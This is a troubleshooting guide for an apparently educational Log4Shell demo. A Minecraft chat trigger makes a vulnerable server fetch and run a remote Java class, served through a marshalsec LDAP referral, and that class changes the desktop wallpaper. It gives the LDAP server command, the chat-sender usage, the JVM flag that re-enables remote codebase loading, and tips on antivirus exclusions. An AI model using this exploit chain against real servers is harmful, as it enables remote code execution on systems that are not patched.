# Troubleshooting

Work from the outside in: **network → Minecraft chat → LDAP referral → class
download → payload execution → desktop wallpaper.** Each step leaves evidence.

---

## 1. The attacker script won't start

### `Port 8000/1389 is already in use`

Find and stop the old process:

```bash
# macOS/Linux
lsof -nP -iTCP:8000 -sTCP:LISTEN
lsof -nP -iTCP:1389 -sTCP:LISTEN
```

Kill only the old demo process, not something else. Or run with different ports:

```bash
./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20 --http-port 8001 --ldap-port 1390
```

If you change the LDAP port, the trigger changes automatically; the victim only
needs to reach the new port.

### `Missing java` / `marshalsec jar missing`

- `./build-payload.sh` downloads the prebuilt marshalsec jar on first run. Do
  this **before** the event (needs internet).
- If you are offline at the event and the jar is missing, copy it from a machine
  that has it: `attacker/vendor/marshalsec-0.0.3-SNAPSHOT-all.jar`.
- Java 8+ is fine for the LDAP server. The victim still needs Java 8.

### LDAP server exits immediately

Read `attacker/logs/ldap.log`. Common causes: port in use, bad jar path, a Java
version that cannot load the shaded jar. Test manually:

```bash
java -cp attacker/vendor/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer 'http://10.10.10.10:8000/#WallpaperPayload' 1389
```

Expected: `Listening on 0.0.0.0:1389`.

---

## 2. The kid's chat doesn't reach Minecraft

### From attacker VM

```bash
python3 attacker/chat-send.py --host 10.10.10.20 --port 25565 --message 'hello'
```

Expected output:

```
[client] connecting to 10.10.10.20:25565 as EHAX_Guest
[client] logged in as EHAX_Guest
[client] sent chat: hello
[client] done
```

Victim `server.log` should show:

```
<EHAX_Guest> hello
```

If not:

| Symptom | Fix |
|---|---|
| `Connection refused` | Server not running, wrong IP/port, or firewall. On victim: `ss -lntp | grep 25565`. |
| `Connection timed out` | Host-only network/adapter not connected; wrong subnet; firewall. `ping 10.10.10.20`. |
| `server disconnected: ...` | Check `online-mode=false` in `server.properties` and restart. |
| `Bad packet id` / decoder error | The client sent the chat too early or wrong protocol. Use the included `chat-send.py` as-is; don't hand-roll a client. |
| Chat appears but no LDAP log | The trigger wasn't the JNDI string, or Log4j isn't vulnerable. Verify the exact message. |
| Chat is cut off | 1.8.8 chat limit is 100 chars. The trigger is ~40 chars; fine. |
| Bot logs in then immediately disconnects | Normal after it closes; check `server.log` for the chat line before the reset message. |

### `online-mode=true`

The server will ask for encryption and the minimal client cannot do Microsoft
auth. Set:

```properties
online-mode=false
```

Restart the server. This is safe because the VM is isolated and the server is
disposable.

### `network-compression-threshold` not -1

The Python client supports compression, but the lab template disables it to
keep the path simple. If you reuse another server.properties, either set:

```properties
network-compression-threshold=-1
```

or keep it and rely on the client's compression support. Compression must be
consistent; a mismatch produces decoder errors.

---

## 3. No LDAP referral in `attacker/logs/ldap.log`

Expected after a trigger:

```
Listening on 0.0.0.0:1389
Send LDAP reference result for a redirecting to http://10.10.10.10:8000/WallpaperPayload.class
```

If the LDAP log is empty:

- The trigger never reached the server log. Check the chat line in
  `victim/server.log`.
- The server has a patched Log4j, or JNDI lookups are disabled. Minecraft 1.8.8
  should be vulnerable; confirm you downloaded the 1.8.8 server, not a newer
  version.
- The trigger IP is wrong. It must be the **attacker VM's** host-only IP, not
  `127.0.0.1` (unless both are on the same machine).
- The victim cannot reach the attacker on 1389. From victim:
  `nc -vz 10.10.10.10 1389` (netcat is fine for a port check; it is not an LDAP
  server).
- A firewall is dropping the callback. Allow 1389 and 8000 from victim to
  attacker.

### `nc` is not an LDAP server

Netcat can listen on 1389, but it cannot speak LDAP. Log4j will connect and then
fail/hang. Use marshalsec (`run-demo.sh` does this) or another real LDAP
referral server.

---

## 4. LDAP referral works, but the class isn't loaded

Check the HTTP log:

```bash
tail -f attacker/logs/http.log
```

Expected:

```
GET /WallpaperPayload.class
GET /ehax-wallpaper.png
```

If you see `404`:

- `attacker/serve/WallpaperPayload.class` is missing → run
  `./build-payload.sh`.
- `WallpaperPayload$1.class` is missing → the build script must copy **all**
  `WallpaperPayload*.class` files, not just the main class.
- `ehax-wallpaper.png` is missing → copy/regenerate it.

### Java 8u191+ blocks remote codebase loading

Symptom: LDAP log shows the referral, HTTP log shows the class download, but the
payload never runs (no proof file; maybe no class request at all). The JVM may
silently refuse the remote codebase.

The victim start scripts set:

```
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true
```

Verify it is actually on the Java command line. If you use your own launch
script, add it. This flag is **lab-only**; never use it on a real server.

### The class downloads but throws

Check `victim/server.log` and `/tmp/ehax-payload.log`.

- `ClassNotFoundException: WallpaperPayload$1` → the inner class wasn't served.
  Copy all `WallpaperPayload*.class` files.
- `NoClassDefFoundError` for another class → the class file was compiled for a
  newer Java than the victim. Rebuild with `--release 8` (the build script does
  this).
- `SecurityException` / `ClassCastException` → see below.

### `ClassCastException: javax.naming.Reference cannot be cast to String`

This is **expected** with Log4j 2.0-beta9. Log4j's `JndiLookup` expects a String,
but JNDI returns a `Reference`; the appender logs an error. The important part:
the class was already loaded and its static initializer ran. Check
`/tmp/ehax-payload-proof.txt`. The server usually keeps running. Don't panic, and
don't show the stack trace to the audience unless you want to explain it.

---

## 5. Payload runs (proof exists) but wallpaper doesn't change

First confirm execution:

```bash
cat /tmp/ehax-payload-proof.txt
cat /tmp/ehax-payload.log
```

A line like `wallpaper-changed` means the setter returned success. If it says
`wallpaper-failed`, read the log.

### Common causes

| Cause | Fix |
|---|---|
| Server console is full-screen | Minimise it; the wallpaper changed behind the terminal. |
| Screen is locked | Unlock; disable lock/blanking before the event. |
| Victim server started over SSH | No desktop session. Start from a terminal inside the VM's desktop. |
| Server started as root/systemd | Root's session is not the logged-in user's desktop. Run as the normal user from the desktop. |
| GNOME/Unity | `gsettings` needs DBus. Check `echo $DBUS_SESSION_BUS_ADDRESS` or `/run/user/$(id -u)/bus`. Start from the desktop terminal. |
| XFCE | The payload finds `/backdrop/.../last-image` properties and sets them. Check `xfconf-query -c xfce4-desktop -l`. |
| KDE | The payload tries `plasma-apply-wallpaperimage` then `qdbus`. If neither works, use a GNOME/Ubuntu VM for the demo. |
| Windows service/Scheduled Task | Session 0 isolation: the wallpaper changes for the wrong session. Run the server from the logged-in user's console. |
| Windows PowerShell blocked | The payload falls back to `reg add` + `rundll32`. Check `%TEMP%\ehax-payload.log`. |
| Windows Defender/SmartScreen blocks the class or PowerShell | This is a disposable lab VM. Add an exclusion for the `victim` folder/temp dir or use an Ubuntu victim VM. Never disable protection on a real machine. |
| Wallpaper is set but hidden by a game | Run the victim server only, not a full-screen Minecraft client. The victim screen should show the desktop. |
| Multiple desktops/workspaces | The payload sets all desktops on GNOME; if you use a non-GNOME DE, check the active workspace. |

### Reset / trigger again

The payload deduplicates runs within 5 seconds (Log4j can process the same line
once per appender). If you need to trigger again immediately:

```bash
rm -f /tmp/ehax-payload-last-run
```

Then send the trigger again. Or wait 5 seconds.

### Wallpaper changed but looks wrong

- The image may be scaled/cropped by the desktop. Use `zoom`/`fill`, not `tile`.
- On Windows, set `WallpaperStyle=10` (fill). The PowerShell path uses
  `SystemParametersInfo`; the registry fallback sets `WallpaperStyle=10`.
- On GNOME, `picture-options` is set to `zoom`.
- If the image is too bright/washed out outdoors, use the JPG/PNG from
  `assets/` and test at max brightness.

---

## 6. The trigger works once, then not again

- The payload's 5-second dedupe marker: `rm -f /tmp/ehax-payload-last-run`.
- The JVM may cache the remote class or the JNDI connection. Restart the
  victim server between batches if in doubt.
- The victim wallpaper is already the reveal image; the change is invisible.
  Reset the wallpaper or restore the snapshot.
- The LDAP server may have died; check `attacker/logs/ldap.log` and restart
  `run-demo.sh`.

---

## 7. The victim VM is slow / server takes forever

- Minecraft 1.8.8 needs ~1 GB RAM. Give the VM 2 GB.
- Allocate 2 vCPUs.
- Use a lightweight Ubuntu Desktop, not a full GNOME + browser + IDE.
- Close the browser and software updater.
- Wait for `Done (…)!` before the first batch.

---

## 8. Daylight / no projector

- Max screen brightness; disable auto-brightness.
- Put the victim laptop in shade; angle the screen toward the kids.
- Use a dark wallpaper before the reveal; the green reveal is high contrast.
- Clean the screen; fingerprints ruin the effect.
- If the screen is washed out, increase the headline size/contrast in
  `assets/make_wallpaper.py`, regenerate, and test.

---

## 9. Quick health-check script

Run this from the attacker VM after starting the demo servers:

```bash
curl -sI http://10.10.10.10:8000/WallpaperPayload.class | head -1
curl -sI http://10.10.10.10:8000/ehax-wallpaper.png | head -1
# port check (netcat is fine here)
nc -vz 10.10.10.10 1389
nc -vz 10.10.10.20 25565
```

Expected: `HTTP/1.0 200 OK`, `succeeded`, `succeeded`.

From the victim VM:

```bash
nc -vz 10.10.10.10 1389
nc -vz 10.10.10.10 8000
```

Both should succeed on the host-only network. If not, fix networking before
touching the payload.

---

## 10. When to stop debugging and use the backup

If the queue is moving and the live demo fails after one retry:

1. Show the 20-second backup recording.
2. Keep the explanation and disclaimer.
3. Fix the station between batches.
4. Never fake a live run or claim a pre-recorded clip is live.

The lesson is the vulnerability and the patch, not the specific wallpaper.
